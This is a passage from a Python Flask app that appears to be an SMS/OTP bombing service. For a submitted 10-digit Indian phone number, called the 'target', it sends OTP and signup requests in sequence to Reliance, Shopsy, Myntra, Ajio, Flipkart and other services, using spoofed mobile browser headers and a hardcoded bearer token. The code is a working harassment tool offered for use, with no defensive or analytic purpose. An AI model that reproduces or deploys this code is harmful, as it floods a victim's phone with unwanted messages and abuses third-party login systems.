        results.append({"service": "PW", "status": r20.status_code, "response": r20.text})
    except Exception as e:
        results.append({"service": "PW", "status": "Error", "response": str(e)})

    # --- API 21: Reliance ---
    try:
        headers21 = {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI5LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzU3MDQzMjE4LCJzYWx0IjowfQ.f2c844dH_df5Hf0y1mIXipqTX8BMgUzbNDe-sV7jEdI",
            "content-type": 'application/json',
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }

        payload21 = {
            "mobile": number.replace("+91", "")
        }

        r21 = requests.post(
            'https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp',
            headers=headers21, 
            json=payload21,
            timeout=10
        )
        results.append({"service": "Reliance", "status": r21.status_code, "response": r21.text})
    except Exception as e:
        results.append({"service": "Reliance", "status": "Error", "response": str(e)})

    # --- API 22: Shopsy ---
    try:
        headers22 = {
            'authority': 'www.shopsy.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.shopsy.in',
            'referer': 'https://www.shopsy.in/login?ret=%2F&entryPage=HEADER_ACCOUNT&sourceContext=DEFAULT',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"2201117PI"',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-partner-context': '{"source":"reseller"}',
            'x-user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.4/msite/Mobile',
        }

        json_data22 = {
            'actionRequestContext': {
                'loginIdPrefix': '+91',
                'loginId': number.replace("+91", ""),
                'clientQueryParamMap': {
                    'ret': '/',
                    'entryPage': 'HEADER_ACCOUNT',
                },
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE',
                'sourceContext': 'DEFAULT',
                'type': 'LOGIN_IDENTITY_VERIFY',
            },
        }

        r22 = requests.post(
            'https://www.shopsy.in/2.rome/api/1/action/view',
            headers=headers22,
            json=json_data22,
            timeout=10
        )
        results.append({"service": "Shopsy", "status": r22.status_code, "response": r22.text})
    except Exception as e:
        results.append({"service": "Shopsy", "status": "Error", "response": str(e)})
        
    # --- API 23: Myntra ---
    try:
        url = "https://www.myntra.com/register/mobile"
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.myntra.com",
            "referer": "https://www.myntra.com/register",
            "user-agent": "Mozilla/5.0"
        }
        json_data = {
            "mobile": number.replace("+91", ""),
            "email": "",
            "password": "Test@123",
            "firstName": "User",
            "lastName": "Demo"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=10)
        results.append({"service": "Myntra", "status": r.status_code, "response": r.text})
    except Exception as e:
        results.append({"service": "Myntra", "status": "Error", "response": str(e)})  
        
    # --- API 24: Ajio ---
    try:
        url = "https://login.web.ajio.com/api/auth/otp"
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.ajio.com",
            "referer": "https://www.ajio.com/",
            "user-agent": "Mozilla/5.0"
        }
        json_data = {
            "mobileNumber": number.replace("+91", ""),
            "countryCode": "+91"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=10)
        results.append({"service": "Ajio", "status": r.status_code, "response": r.text})
    except Exception as e:
        results.append({"service": "Ajio", "status": "Error", "response": str(e)})
        
    # --- API 25: Flipkart ---
    try:
        url = "https://www.flipkart.com/api/6/user/signup/status"
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.flipkart.com",
            "referer": "https://www.flipkart.com/",
            "user-agent": "Mozilla/5.0"
        }
        json_data = {
            "loginId": number.replace("+91", ""),
            "loginType": "MOBILE",
            "verificationType": "OTP"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=10)
        results.append({"service": "Flipkart", "status": r.status_code, "response": r.text})
    except Exception as e:
        results.append({"service": "Flipkart", "status": "Error", "response": str(e)})                

    return results

@app.route('/')
def home():
    return jsonify({
        "error": "Please use the correct endpoint: /num=<mobile_number>",
        "example": "http://your-domain.com/num=9876543210"
    })

@app.route('/num=<mobile_number>')
def send_otp_endpoint(mobile_number):
    if not mobile_number.isdigit() or len(mobile_number) != 10:
        return jsonify({
            "error": "Invalid mobile number format",
            "message": "Please provide a valid 10-digit mobile number without country code",
            "example": "http://your-domain.com/num=9876543210"
        })
    
    try:
        results = send_otp(mobile_number)
        return jsonify({
            "status": "complete",
            "target": mobile_number,
            "developer": "@j4tnx",
            "results": results
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "target": mobile_number,
            "developer": "@j4tnx",
            "message": str(e)
        })

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
